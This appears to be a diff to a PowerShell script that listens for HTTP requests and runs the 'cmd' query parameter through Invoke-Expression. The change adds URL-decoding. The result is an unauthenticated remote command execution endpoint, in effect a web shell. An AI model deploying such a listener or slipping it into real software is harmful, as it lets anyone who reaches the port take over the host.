@@ -1,3 +1,4 @@
+[System.Reflection.Assembly]::LoadWithPartialName("System.Web")
 $location = gl
 
 filter log () {
@@ -32,13 +33,15 @@ while (1) {
     
     $res = "Gimme Powershell Please!"  
     $query = $ctx.Request.QueryString
+	
+	$cmd = [System.Web.HttpUtility]::UrlDecode( $query[ "cmd" ] )
     
-    if ( $query[ "cmd" ] ) {
+    if ( $cmd ) {
         
         $error.clear()        
-        $query[ "cmd" ] | log
+        $cmd | log
         
-        $t = measure-command {$res = iex $query[ "cmd" ] | Out-String}
+        $t = measure-command {$res = iex $cmd | Out-String}
         "time to run: $t" | log
         
         if($error) {            
